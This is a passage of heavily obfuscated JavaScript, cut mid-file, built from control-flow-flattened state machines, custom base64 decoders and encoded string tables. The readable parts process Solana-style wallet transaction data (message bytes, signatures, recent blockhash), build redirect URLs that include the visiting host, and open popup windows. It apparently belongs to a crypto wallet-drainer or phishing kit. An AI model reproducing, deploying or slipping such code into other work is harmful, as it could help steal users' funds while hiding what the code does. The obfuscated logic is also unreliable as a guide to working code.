              break;
            case -40:
            case _str_cache != 64 && _str_cache - 133:
              return _s5 = true, _s2.decode(_v1034);
              _noop(__str_table__["\u774E"] = __str_table__["\u9F35"], _str_cache += 149);
              break;
            case _str_cache - 306:
              _noop(__str_table__["\u774E"] = __str_table__["_v1419"], _s4 += 139, _str_cache += -105);
              break;
            case 163:
            case __str_table__["_v1419"]["\u833D"] + 211:
            case 233:
              _noop(__str_table__["\u774E"] = __str_table__["\u545B"], _s4 += -81);
              break;
            case -122:
            case _str_cache - 25:
            case 155:
              _s1[-218] = 0;
              for (let _s6 = 0; _s6 < _v1035 - _v1222; _s6++) {
                const _s7 = _s1[0]["charCodeAt"](_s6);
                if (_s7 == CONSTS[_s4 + 32]) break;
                _noop(_s1[1] = _s1[1] << 6 | _s3[_s7], _s1[116] += CONSTS[_s4 + 33]);
                if (_s1[116] >= 8) {
                  _noop(_s1[CONSTS[_s4 + 590]] -= 8, _v1034[_s1[-CONSTS[_s4 + 591]]++] = _s1[1] >> _s1[116] & CONSTS[_s4 + 171])
                }
              }
              _noop(__str_table__["\u774E"] = __str_table__["_v1419"], _s4 += -108);
              break;
            case _s4 != -370 && _s4 != 71 && _s4 != -306 && _s4 - -169:
              _noop(__str_table__["\u774E"] = __str_table__["_v1419"], _s4 += 406, _str_cache += -380);
              break;
              if (_str_cache > 169) {
                _noop(__str_table__["\u774E"] = __str_table__["\u5E5A"], _s4 += 72, _str_cache += -105);
                break
              }
            case -194:
            case -55:
            case __str_table__["_v1419"]["\u833D"] + 349:
              _noop(__str_table__["_v1419"]["_v1418"] = _v1035 * 3 / CONSTS[_s4 + -199] - _v1222, __str_table__["_v1419"]["_v1034"] = new Uint8Array(_v1418), __str_table__["\u774E"] = __str_table__["_v1419"], _s4 += -27, _str_cache += -221);
              break;
            case -7:
            case -49:
              _noop([__str_table__["_v1419"]["\u5798"], __str_table__["_v1419"]["\u833D"], __str_table__["_v1419"]["\u6870"]] = [-66, -199, 115], _s1[CONSTS[_s4 + 137]] = CONSTS[_s4 + 136], _v1419["_v1035"] = _s1[CONSTS[_s4 + 138]].length, __str_table__["\u774E"] = __str_table__["_v1419"], _s4 += 333, _str_cache += -336);
              break;
            case -123:
            case _s4 - 211:
              _noop(__str_table__["_v1419"]["_v1223"] = _s1[0].indexOf("="), __str_table__["_v1419"]["_v1222"] = _v1223 == -CONSTS[_s4 + -197] ? CONSTS[_s4 + -(_s4 + -6)] : _v1035 - _v1223, __str_table__["\u774E"] = __str_table__["_v1419"], _str_cache += 160);
              break;
            case 240:
              _noop(__str_table__["\u774E"] = __str_table__["_v1419"], _s4 += 130, _str_cache += -380);
              break;
              if (_str_cache > _s4 + 98) {
                _noop(__str_table__["\u774E"] = __str_table__["\u9700"], _s4 += -204, _str_cache += -105);
                break
              }
          }
        }
      }
    }
    _noop(_s5 = undefined, _s4 = _str_cache(-132, 125)["next"]()["value"]);
    if (_s5) {
      return _s4
    }
  }

  function _s4(..._s1) {
    var _s3, _s2;

    function* _s4(_s2, _s4, _s6, _s7 = {
      ["\u852B"]: {}
    }) {
      while (_s2 + _s4 + _s6 !== 190) {
        with(_s7["\u7710"] || _s7) {
          switch (_s2 + _s4 + _s6) {
            case _s7["\u852B"]["\u8C68"] + -302:
              _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -551, _s4 += 691, _s6 += -156);
              break;
            case _s2 - -183:
              return _s3 = true, _str_cache[_s1[0]] = _s5(__str_table__[_s1[0]]);
              _noop(_s7["\u7710"] = _s7["\u852B"], _s4 += 388);
              break;
            case 189:
              _noop([_s7["\u852B"]["\u8C68"], _s7["\u852B"]["\u5E9E"], _s7["\u852B"]["\u6367"]] = [109, -86, -208], _s1["length"] = CONSTS[_s4 + 64]);
              if (typeof _str_cache[_s1[CONSTS[_s4 + 66]]] === CONSTS[_s4 + 76]) {
                _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -149, _s4 += 164, _s6 += -413);
                break
              } else {
                _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -149, _s4 += 552, _s6 += -413);
                break
              }
            case _s4 - -275:
            case 133:
            case -36:
              _s1[CONSTS[_s4 + 73]] = CONSTS[_s4 + 72];
              if (typeof _str_cache[_s1[0]] === "undefined") {
                _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -435, _s4 += 172, _s6 += -153);
                break
              } else {
                _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -435, _s4 += 560, _s6 += -153);
                break
              }
            case _s4 - -87:
              _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -551, _s4 += 631, _s6 += 151);
              break;
            case -50:
            case _s6 - -91:
            case 59:
              _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -551, _s4 += 560, _s6 += 366);
              break;
            default:
              _noop([_s7["\u852B"]["\u8C68"], _s7["\u852B"]["\u5E9E"], _s7["\u852B"]["\u6367"]] = [211, -42, -175], _s7["\u7710"] = _s7["\u852B"], _s4 += 448, _s6 += -368);
              break;
            case -237:
            case _s6 - 299:
              _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -161, _s4 += 560, _s6 += -153);
              break;
            case 102:
            case -24:
              [_s7["\u852B"]["\u8C68"], _s7["\u852B"]["\u5E9E"], _s7["\u852B"]["\u6367"]] = [58, 196, -55];
              return _s3 = true, _str_cache[_s1[0]] = _s5(__str_table__[_s1[CONSTS[_s2 + 68]]]);
              _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -330, _s4 += 560, _s6 += -153);
              break;
            case _s4 != 104 && _s4 - 313:
              return _s3 = true, _str_cache[_s1[0]];
              _noop(_s7["\u7710"] = _s7["\u6985"], _s2 += 398, _s4 += -637, _s6 += 250);
              break;
              if (_s2 > -(_s4 + -443)) {
                _s7["\u7710"] = _s7["\u852B"];
                break
              }
            case 227:
            case 194:
            case 210:
              _s1["length"] = 1;
              if (typeof _str_cache[_s1[0]] === "undefined") {
                _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -705, _s4 += 278, _s6 += -9);
                break
              } else {
                _noop(_s7["\u7710"] = _s7["\u852B"], _s2 += -705, _s4 += 666, _s6 += -9);
                break
              }
          }
        }
      }
    }
    _noop(_s3 = undefined, _s2 = _s4(-243, -60, 492)["next"]()["value"]);
    if (_s3) {
      return _s2
    }
  }
  _s1["a"] = appState["dt"];
  if (!_s1["a"]) {
    return "null"
  }
  _noop(_s1[125] = _s1["a"]["includes"](".github.io"), _s1[196] = _s4(186) + _s1["a"] + _s4(187) + (_s1[125] ? "?" : "") + _v215(appState["Se"]) + "?b=" + _s1[0], _s1[-169] = location["host"], _s1[-169] != appState["Se"] && (_s1[196] += "&d=" + _v215(_s1[-169])), _s1["e"] = _v291(_v184, appState["Ne"]));
  return _s1["e"] && (_s1[196] += "&" + _s1["e"]), _s1[196]
}

function _isMobileCheck() {
  return location["search"]["includes"]("?b=")
}

function _v1224() {
  return _v332["test"](location["pathname"]) && _isMobileCheck()
}

function _v1036(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5 = {
    ["\u9447"]: {}
  }) {
    while (_s1 + _s3 + _s2 !== 205) {
      with(_s5["\u7E4E"] || _s5) {
        switch (_s1 + _s3 + _s2) {
          case -178:
          case -154:
          case 236:
            [_s5["\u9447"]["\u6534"], _s5["\u9447"]["\u6568"]] = [202, -168];
            if (!_isMobileCheck()) {
              _noop(_s5["\u7E4E"] = _s5["\u9447"], _s1 += 239, _s2 += -725);
              break
            } else {
              _noop(_s5["\u7E4E"] = _s5["\u9447"], _s1 += 403, _s3 += 151, _s2 += -725);
              break
            }
          case -67:
            _noop(_s5["\u7E4E"] = _s5["\u9447"], _s1 += 392, _s3 += -85, _s2 += -175);
            break;
          case -204:
            _noop(_str_cache[CONSTS[_s3 + -89]] = _str_cache["a"][CONSTS[_s1 + 340] + "f"](CONSTS[_s3 + 460]), _str_cache["d"] = _str_cache[CONSTS[_s3 + -89]] != -CONSTS[_s3 + -85] ? _str_cache[CONSTS[_s1 + -50]] : void 0, _s5["\u7E4E"] = _s5["\u9447"], _s1 += -82, _s2 += 393);
            break;
            if (!(_s2 == -343)) {
              _noop(_s5["\u7E4E"] = _s5["\u553C"], _s1 += -212, _s3 += 716, _s2 += -95);
              break
            }
          case _s2 - -659:
            _noop(_s5["\u7E4E"] = _s5["\u9447"], _s1 += -116, _s3 += -404, _s2 += 95);
            break;
            if (_s3 == 144) {
              _noop(_s5["\u7E4E"] = _s5["\u9447"], _s1 += -116, _s3 += -404, _s2 += 95);
              break
            }
          case -250:
          case 58:
            return __str_table__ = true, undefined;
            _noop(_s5["\u7E4E"] = _s5["\u9447"], _s1 += 164, _s3 += 151);
            break;
          case _s2 - -223:
            _noop(_str_cache["a"] = location["search"], _str_cache[CONSTS[_s3 + 94]] = _str_cache["a"][CONSTS[_s3 + 465] + CONSTS[_s1 + -65]]("?b="), _s5["\u7E4E"] = _s5["\u9447"], _s1 += -248, _s3 += 164, _s2 += -185);
            break;
          case _s1 - -345:
          case -129:
          case -128:
          case 187:
            _noop(_s5["\u7E4E"] = _s5["\u9447"], _s1 += 144, _s3 += -260, _s2 += -275);
            break;
          case -58:
          case -91:
            _noop([_s5["\u9447"]["\u6534"], _s5["\u9447"]["\u6568"]] = [106, -5], _s5["\u7E4E"] = _s5["\u9447"], _s1 += 212, _s3 += -453, _s2 += 95);
            break;
          default:
          case 173:
          case 195:
            _noop(_s5["\u7E4E"] = _s5["\u6EE9"], _s1 += -395, _s3 += 612);
            break;
          case _s3 - -283:
            return __str_table__ = true, _str_cache["e"];
            _noop(_s5["\u7E4E"] = _s5["\u9447"], _s3 += 287, _s2 += -488);
            break;
          case _s3 - -18:
            _str_cache[CONSTS[_s3 + 66]] = _g(CONSTS[_s3 + 140])["parseI" + CONSTS[_s3 + 78]](_str_cache["a"]["substr" + CONSTS[_s1 + 607]](_str_cache[CONSTS[_s1 + 51]] + 3, _str_cache[CONSTS[_s1 + 50]]));
            if (!Number["isNaN"](_str_cache["e"])) {
              _noop(_s5["\u7E4E"] = _s5["\u9447"], _s1 += 265, _s3 += -183);
              break
            } else {
              _noop(_s5["\u7E4E"] = _s5["\u9447"], _s1 += 265, _s3 += 104, _s2 += -488);
              break
            }
          case -169:
          case _s5["\u9447"]["\u6534"] + -69:
            _noop([_s5["\u9447"]["\u6534"], _s5["\u9447"]["\u6568"]] = [-123, -224], _s5["\u7E4E"] = _s5["\u9447"], _s1 += 392, _s3 += -104, _s2 += -356);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-105, -226, 567)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v563(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5, _s4 = {
    ["\u9656"]: {}
  }) {
    while (_s1 + _s3 + _s2 + _s5 !== -38) {
      with(_s4["\u6BDD"] || _s4) {
        switch (_s1 + _s3 + _s2 + _s5) {
          case _s2 - -233:
            _str_cache[CONSTS[_s3 + 302]] = performance(_str_cache[0], "", "popup=true," + _str_cache[CONSTS[_s3 + 320]] + getString(189));
            if (!_str_cache[CONSTS[_s1 + -563]]) {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -549, _s3 += 68, _s2 += 800, _s5 += -218);
              break
            } else {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -943, _s3 += 447, _s2 += 174, _s5 += 61);
              break
            }
            if (_s3 != -233) {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -549, _s3 += 68, _s2 += 361, _s5 += -54);
              break
            }
          case 104:
          case -167:
            return __str_table__ = true, _v6["close"](), _g("cPfZGl" + CONSTS[_s1 + 21])("beforeunload", () => {
              return _str_cache[3]["close"]()
            });
            _noop(_s4["\u6BDD"] = _s4["\u58D4"], _s1 += -509, _s3 += -103, _s2 += 444, _s5 += 297);
            break;
            if (!(_s1 == -379)) {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -264, _s3 += -488, _s2 += 371, _s5 += 347);
              break
            }
          case _s2 - -113:
            _noop([_s4["\u9656"]["\u8A8B"], _s4["\u9656"]["\u8DF6"], _s4["\u9656"]["\u779B"]] = [13, 64, -111], _s4["\u6BDD"] = _s4["\u9656"], _s1 += -234, _s3 += 31, _s2 += 626, _s5 += -376);
            break;
          case _s5 - 428:
            _noop(_s4["\u6BDD"] = _s4["\u8016"], _s1 += 190, _s3 += 39, _s2 += 202, _s5 += -419);
            break;
          case _s4["\u9656"]["\u8DF6"] + -352:
            _str_cache[3] = performance(_str_cache[CONSTS[_s1 + -9]], "", "popup=true," + _str_cache[CONSTS[_s2 + -138]] + getString(CONSTS[_s3 + 435]));
            if (!_str_cache[3]) {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s2 += 439, _s5 += -164);
              break
            } else {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -394, _s3 += 379, _s2 += -187, _s5 += 115);
              break
            }
            if (_s3 != -233) {
              _s4["\u6BDD"] = _s4["\u9656"];
              break
            }
          case 1:
            _noop(_str_cache[-196] = _WC_core["width"] / 2 - 180, _str_cache[CONSTS[_s2 + 420]] = getString(_s2 + 589) + (_WC_core["height"] / CONSTS[_s3 + 42] - Math[CONSTS[_s1 + -213]](_clamp("_v297", 450, 2), 300)) + ",left=" + _str_cache[-196], _s4["\u6BDD"] = _s4["\u9656"], _s1 += -549, _s3 += -191, _s2 += 558, _s5 += 36);
            break;
          case -190:
          case _s4["\u9656"]["\u8A8B"] + 140:
            _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -315, _s3 += 229, _s2 += 247, _s5 += -394);
            break;
          case _s4["\u9656"]["\u8DF6"] + -77:
            _g("ES_ig0" + CONSTS[_s2 + -433])["href"] = _str_cache[CONSTS[_s2 + -590]];
            return __str_table__ = true, undefined;
            _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -394, _s3 += 379, _s2 += -626, _s5 += 279);
            break;
          case 98:
          case -189:
          case 118:
            _noop([_s4["\u9656"]["\u8A8B"], _s4["\u9656"]["\u8DF6"], _s4["\u9656"]["\u779B"]] = [-105, 207, -35], _str_cache[-CONSTS[_s1 + 515]] = _WC_core["width"] / CONSTS[_s3 + 225] - CONSTS[_s3 + 803], _str_cache[CONSTS[_s3 + 244]] = "noopener noreferrer" + (_g(CONSTS[_s3 + 802])[CONSTS[_s2 + 1125]] / 2 - Math["max"](_clamp("_v297", 450, 2), 300)) + ",left=" + _str_cache[-196], _s4["\u6BDD"] = _s4["\u9656"], _s1 += -41, _s3 += -8, _s2 += -15, _s5 += 108);
            break;
          case _s5 - -413:
          case -214:
          case 219:
            _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -234, _s3 += -354, _s2 += 114, _s5 += 527);
            break;
            if (_s1 > _s2 + 206) {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += 315, _s3 += -229, _s2 += -247, _s5 += 394);
              break
            }
          case 196:
          case 194:
          case -232:
            return __str_table__ = true, _v6["close"](), _g("cPfZGl" + CONSTS[_s3 + 5])("beforeunload", () => {
              return _str_cache[3]["close"]()
            });
            _noop(_s4["\u6BDD"] = _s4["\u8F6D"], _s3 += -25, _s2 += 73, _s5 += 146);
            break;
            if (!(_s1 == -(_s2 + 409))) {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += 245, _s3 += -410, _s5 += 196);
              break
            }
          default:
            _str_cache[3] = performance(_str_cache[0], "", "popup=true," + _str_cache["b"] + getString(189));
            if (!_str_cache[3]) {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -228, _s3 += -708, _s2 += 997, _s5 += -128);
              break
            } else {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -622, _s3 += -329, _s2 += 371, _s5 += 151);
              break
            }
            if (_s3 != -233) {
              _noop(_s4["\u6BDD"] = _s4["\u9656"], _s1 += -228, _s3 += -708, _s2 += 558, _s5 += 36);
              break
            }
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(56, -225, 172, -192)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}
_noop(HttpError = class extends Error {}, _v699 = _v1208());

function _v1037(_str_cache) {
  return {
    ["toString"]: () => {
      return _str_cache
    },
    ["toBase58"]: () => {
      return _str_cache
    },
    ["toBytes"]: () => {
      return _buildList(_str_cache)
    }
  }
}

function _v288(..._s1) {
  _noop(_limitArgs(_s4), _limitArgs(_s5));
  const _s3 = {
    ["43"]: 21,
    ["47"]: 9,
    ["48"]: 33,
    ["49"]: 62,
    ["50"]: 19,
    ["51"]: 16,
    ["52"]: 50,
    ["53"]: 27,
    ["54"]: 14,
    ["55"]: 47,
    ["56"]: 23,
    ["57"]: 1,
    ["65"]: 2,
    ["66"]: 44,
    ["67"]: 35,
    ["68"]: 30,
    ["69"]: 29,
    ["70"]: 55,
    ["71"]: 25,
    ["72"]: 18,
    ["73"]: 41,
    ["74"]: 61,
    ["75"]: 8,
    ["76"]: 24,
    ["77"]: 63,
    ["78"]: 60,
    ["79"]: 20,
    ["80"]: 4,
    ["81"]: 43,
    ["82"]: 31,
    ["83"]: 54,
    ["84"]: 42,
    ["85"]: 46,
    ["86"]: 5,
    ["87"]: 22,
    ["88"]: 36,
    ["89"]: 34,
    ["90"]: 39,
    ["97"]: 48,
    ["98"]: 17,
    ["99"]: 45,
    ["100"]: 0,
    ["101"]: 12,
    ["102"]: 57,
    ["103"]: 59,
    ["104"]: 26,
    ["105"]: 58,
    ["106"]: 11,
    ["107"]: 28,
    ["108"]: 13,
    ["109"]: 49,
    ["110"]: 3,
    ["111"]: 10,
    ["112"]: 40,
    ["113"]: 37,
    ["114"]: 52,
    ["115"]: 53,
    ["116"]: 15,
    ["117"]: 7,
    ["118"]: 38,
    ["119"]: 51,
    ["120"]: 32,
    ["121"]: 6,
    ["122"]: 56
  };
  const _s2 = new TextDecoder;

  function _s5(..._s1) {
    var _s5, _s4;

    function* _s6(_s4, _s6, _str_cache, __str_table__, _s7 = {
      ["_v1420"]: {}
    }) {
      while (_s4 + _s6 + _str_cache + __str_table__ !== -170) {
        with(_s7["\u64BC"] || _s7) {
          switch (_s4 + _s6 + _str_cache + __str_table__) {
            case 40:
            case _str_cache - -57:
            case 238:
              _noop(_s7["_v1420"]["_v1225"] = _s1[0].indexOf("="), _s7["_v1420"]["_v1038"] = _v1225 == -CONSTS[_s6 + 248] ? CONSTS[_s4 + -187] : _v633 - _v1225, _s7["_v1420"]["_v1421"] = _v633 * CONSTS[_str_cache + -(_str_cache + -1)] / 4 - _v1038, _s7["\u64BC"] = _s7["_v1420"], _s4 += -58, _s6 += 75, __str_table__ += -167);
              break;
            case -122:
              _noop([_s7["_v1420"]["\u5A12"], _s7["_v1420"]["\u6961"], _s7["_v1420"]["\u9B8F"]] = [239, 171, 87], _s1["length"] = CONSTS[_s4 + -102], _v1420["_v633"] = _s1[CONSTS[_s4 + -(_s6 + 43)]].length, _s7["\u64BC"] = _s7["_v1420"], _s4 += 87, _s6 += -301, _str_cache += 446, __str_table__ += 81);
              break;
            case _s6 - -126:
            default:
              for (let _s8 = 0; _s8 < _v633 - _v1038; _s8++) {
                const _defineProperty = _s1[0][CONSTS[_s4 + 174]](_s8);
                if (_defineProperty == CONSTS[_s4 + 37]) break;
                _noop(_s1[-218] = _s1[-218] << CONSTS[_s4 + 38] | _s3[_defineProperty], _s1[-CONSTS[_s6 + 403]] += CONSTS[_s4 + 38]);
                if (_s1[-CONSTS[_s4 + 264]] >= 8) {
                  _noop(_s1[-CONSTS[_s6 + 403]] -= 8, _v634[_s1[3]++] = _s1[-218] >> _s1[-210] & CONSTS[_str_cache + 12])
                }
              }
              return _s5 = true, _s2.decode(_v634);
              _noop(_s7["\u64BC"] = _s7["\u7D6B"], _s6 += 318, __str_table__ += -445);
              break;
            case -35:
            case -95:
            case _str_cache - -3:
              [_s7["_v1420"]["\u5A12"], _s7["_v1420"]["\u6961"], _s7["_v1420"]["\u9B8F"]] = [-33, -94, 248];
              for (let _s8 = 0; _s8 < _v633 - _v1038; _s8++) {
                const _defineProperty = _s1[0]["charCodeAt"](_s8);
                if (_defineProperty == CONSTS[_str_cache + 56]) break;
                _noop(_s1[-218] = _s1[-218] << 6 | _s3[_defineProperty], _s1[-CONSTS[_s6 + 357]] += CONSTS[_str_cache + 57]);
                if (_s1[-210] >= 8) {
                  _noop(_s1[-210] -= 8, _v634[_s1[CONSTS[_str_cache + 50]]++] = _s1[-218] >> _s1[-210] & CONSTS[_s4 + 66])
                }
              }
              return _s5 = true, _s2.decode(_v634);
              _noop(_s7["\u64BC"] = _s7["\u813A"], _s4 += -110, _s6 += 272, _str_cache += 183, __str_table__ += -469);
              break;
            case _str_cache - 13:
              _noop([_s7["_v1420"]["\u5A12"], _s7["_v1420"]["\u6961"], _s7["_v1420"]["\u9B8F"]] = [-195, 239, -78], _s7["\u64BC"] = _s7["_v1420"], _s4 += 338, _s6 += -330, __str_table__ += 62);
              break;
            case -12:
            case _s4 - 94:
            case 47:
              _noop(_s7["_v1420"]["_v634"] = new Uint8Array(_v1421), _s1[-218] = CONSTS[_s4 + -129], _s1[-CONSTS[_s6 + 403]] = 0, _s1[3] = CONSTS[_str_cache + -128], _s7["\u64BC"] = _s7["_v1420"], _s4 += -165, __str_table__ += 81);
              break
          }
        }
      }
    }
    _noop(_s5 = undefined, _s4 = _s6(106, 57, -312, 27)["next"]()["value"]);
    if (_s5) {
      return _s4
    }
  }

  function _s4(..._s1) {
    _s1["length"] = 1;
    if (typeof _str_cache[_s1[0]] === "undefined") {
      return _str_cache[_s1[0]] = _s5(__str_table__[_s1[0]])
    }
    return _str_cache[_s1[0]]
  }
  _s1[-41] = _s1[0]["messageBytes"][0] == 129 ? 1 : 0;

  function _s6() {
    return _v699["encode"](_s1[0])
  }
  _noop(_s1[222] = {
    ["version"]: _s1[-41],
    ["Expected Uint8Array"]: [],
    ["serialize"]: () => {
      return _s1[0]["messageBytes"]
    },
    ["header"]: {
      [getString(191)]: _s1[0]["messageBytes"][1],
      [_s4(192)]: _s1[0]["messageBytes"][2],
      [_s4(193)]: _s1[0]["messageBytes"][3]
    },
    get [_s4(194)]() {
      return Object["keys"](_s1[0]["signatures"])["map"](_limitArgs((..._s1) => {
        _s1["length"] = 1;
        return _v1037(_s1[0])
      }))
    },
    get ["recentBlockhash"]() {
      var _s3, _s2;

      function* _s5(_s2, _s4, _s6, _s7, _s8 = {
        ["_v635"]: {}
      }, _defineProperty) {
        while (_s2 + _s4 + _s6 + _s7 !== -173) {
          with(_s8["\u89C6"] || _s8) {
            switch (_s2 + _s4 + _s6 + _s7) {
              case _s8["_v635"]["\u9DD3"] + -443:
                _noop(_s8["_v131"]["_v1422"] = _v1226 * 3 / 4 - _v1227, _s8["_v131"]["_v1228"] = new Uint8Array(_v1422), _s8["\u89C6"] = _s8["_v131"], _s4 += 148, _s7 += 46);
                break;
              case _s2 - -722:
                _noop(_s8["\u89C6"] = _s8["_v131"], _s2 += 217, _s4 += 52, _s6 += 121, _s7 += -727);
                break;
              case -166:
              case -201:
              default:
                return _str_cache[_v1039[0]] = (1, _s8["_v635"]["\u65BF"])(__str_table__[_v1039[0]]);
                _noop(_s8["\u89C6"] = _s8["_v1040"], _s2 += 186, _s4 += -10, _s6 += -449, _s7 += -60);
                break;
              case _s8["_v635"]["\u51DC"] + 22:
                _v109["c"] = 0;
                for (let _getOwnPropDesc = 0; _getOwnPropDesc < _v1226 - _v1227; _getOwnPropDesc++) {
                  const _found = _v109[0]["charCodeAt"](_getOwnPropDesc);
                  if (_found == 61) break;
                  _noop(_v109[-30] = _v109[-30] << 6 | _s8["_v635"]["\u8EF4"][_found], _v109[2] += 6);
                  if (_v109[2] >= 8) {
                    _noop(_v109[2] -= 8, _v1228[_v109["c"]++] = _v109[-30] >> _v109[2] & 255)
                  }
                }
                _noop(_s8["\u89C6"] = _s8["_v131"], _s2 += -413, _s4 += 213, _s6 += 249, _s7 += -81);
                break;
              case 27:
              case _s2 != 208 && _s2 - 252:
              case -20:
                return _str_cache[_v1039[0]];
                return undefined;
              case 114:
              case -41:
              case 166:
                _noop([..._v131["_v109"]] = _defineProperty, _v131["_v109"]["length"] = 1, _v131["_v1226"] = _v131["_v109"][0].length, _v131["\u8A5C"] = _v131["_v109"][0].indexOf("="), _v131["_v1227"] = _v131["\u8A5C"] == -1 ? 0 : _v131["_v1226"] - _v131["\u8A5C"], _s8["\u89C6"] = _s8["_v131"], _s2 += -499, _s4 += 567, _s7 += -409);
                break;
              case 3:
                _noop(_s8["_v635"]["\u8EF4"] = {
                  [CONSTS[_s4 + 434]]: CONSTS[_s4 + 435],
                  ["47"]: 9,
                  [CONSTS[_s4 + 438]]: 33,
                  [CONSTS[_s6 + -70]]: CONSTS[_s4 + 441],
                  ["50"]: CONSTS[_s2 + -(_s2 + -40)],
                  [CONSTS[_s6 + -66]]: 16,
                  ["52"]: 50,
                  [CONSTS[_s6 + -62]]: 27,
                  ["54"]: 14,
                  [CONSTS[_s6 + -58]]: 47,
                  ["56"]: CONSTS[_s4 + 454],
                  ["57"]: 1,
                  [CONSTS[_s4 + 456]]: 2,
                  ["66"]: 44,
                  [CONSTS[_s6 + -51]]: 35,
                  ["68"]: CONSTS[_s4 + 462],
                  [CONSTS[_s2 + -64]]: CONSTS[_s6 + -46],
                  ["70"]: CONSTS[_s6 + -44],
                  ["71"]: 25,
                  ["72"]: CONSTS[_s2 + -98],
                  ["73"]: 41,
                  ["74"]: CONSTS[_s6 + -100],
                  [CONSTS[_s4 + 473]]: CONSTS[_s6 + -97],
                  ["76"]: CONSTS[_s6 + -35],
                  [CONSTS[_s6 + -34]]: 63,
                  ["78"]: CONSTS[_s6 + -32],
                  [CONSTS[_s6 + -31]]: CONSTS[_s6 + -30],
                  ["80"]: 4,
                  ["81"]: CONSTS[_s2 + -44],
                  ["82"]: CONSTS[_s2 + -112],
                  ["83"]: 54,
                  ["84"]: 42,
                  [CONSTS[_s6 + -21]]: 46,
                  ["86"]: CONSTS[_s2 + -121],
                  ["87"]: CONSTS[_s2 + -34],
                  [CONSTS[_s4 + 494]]: CONSTS[_s4 + 495],
                  [CONSTS[_s2 + -31]]: 34,
                  [CONSTS[_s6 + -12]]: 39,
                  ["97"]: 48,
                  [CONSTS[_s6 + -8]]: 17,
                  ["99"]: 45,
                  ["100"]: 0,
                  [CONSTS[_s4 + 507]]: 12,
                  ["102"]: CONSTS[_s2 + -18],
                  ["103"]: CONSTS[_s6 + 1],
                  [CONSTS[_s6 + 2]]: 26,
                  ["105"]: CONSTS[_s4 + 515],
                  ["106"]: 11,
                  ["107"]: CONSTS[_s2 + -8],
                  ["108"]: 13,
                  [CONSTS[_s4 + 522]]: 49,
                  ["110"]: CONSTS[_s6 + -106],
                  ["111"]: 10,
                  ["112"]: 40,
                  ["113"]: 37,
                  ["114"]: CONSTS[_s2 + 5],
                  ["115"]: 53,
                  ["116"]: 15,
                  ["117"]: 7,
                  ["118"]: CONSTS[_s2 + 11],
                  ["119"]: CONSTS[_s2 + 13],
                  ["120"]: 32,
                  ["121"]: 6,
                  ["122"]: CONSTS[_s2 + 18]
                }, _s8["_v635"]["\u6C60"] = new TextDecoder, _s8["\u89C6"] = _s8["_v635"], _s2 += -92, _s4 += 645, _s6 += -332, _s7 += -405);
                break;
              case _s4 != 203 && _s4 - 423:
              case 243:
              case 88:
                _s8["_v635"]["_v1229"] = "fe";
                return _s3 = true, _v1229 in _s1[0][(1, _v1230)(151)] ? _s1[0][(1, _v1230)(151)][_v1229] : "";
                _noop(_s8["\u89C6"] = _s8["\u58DE"], _s2 += -644, _s4 += -130, _s6 += 342, _s7 += 440);
                break;
                if (_s7 == -82) {
                  _noop(_s8["\u89C6"] = _s8["\u5B07"], _s2 += -315, _s4 += -221, _s6 += 449, _s7 += 203);
                  break
                }
              case -44:
                _noop([_s8["_v635"]["\u51DC"], _s8["_v635"]["\u9DD3"]] = [-7, 216], _v635["_v1230"] = function(..._s2) {
                  return _s5(-283, 21, 224, -27, {
                    ["_v635"]: _s8["_v635"],
                    ["_v1040"]: {}
                  }, _s2)["next"]()["value"]
                }, _v635["\u65BF"] = function(..._s2) {
                  return _s5(104, -403, 238, 175, {
                    ["_v635"]: _s8["_v635"],
                    ["_v131"]: {}
                  }, _s2)["next"]()["value"]
                }, _limitArgs(_v635["_v1230"]), _limitArgs(_v635["\u65BF"]), _s8["\u89C6"] = _s8["_v635"], _s2 += -84, _s4 += -317, _s6 += 198, _s7 += 250);
                break;
              case _s8["_v635"]["\u9DD3"] + -233:
                return _s8["_v635"]["\u6C60"].decode(_v1228);
                return undefined;
              case _s6 - 221:
                _noop([_s8["_v635"]["\u51DC"], _s8["_v635"]["\u9DD3"]] = [63, 73], _s8["\u89C6"] = _s8["\u82A8"], _s2 += 716, _s4 += -301, _s6 += 236, _s7 += -318);
                break;
                if (_s2 > -612) {
                  _noop(_s8["\u89C6"] = _s8["_v131"], _s2 += 217, _s4 += 414, _s6 += 236, _s7 += -681);
                  break
                }
              case -31:
              case 29:
              case -65:
                _noop([..._v1040["_v1039"]] = _defineProperty, _v1040["_v1039"]["length"] = 1);
                if (typeof _str_cache[_v1040["_v1039"][0]] === "undefined") {
                  _noop(_s8["\u89C6"] = _s8["_v1040"], _s2 += 129, _s4 += 192, _s7 += -143);
                  break
                } else {
                  _noop(_s8["\u89C6"] = _s8["_v1040"], _s2 += 315, _s4 += 182, _s6 += -449, _s7 += -203);
                  break
                }
              case _s2 - -362:
              case -194:
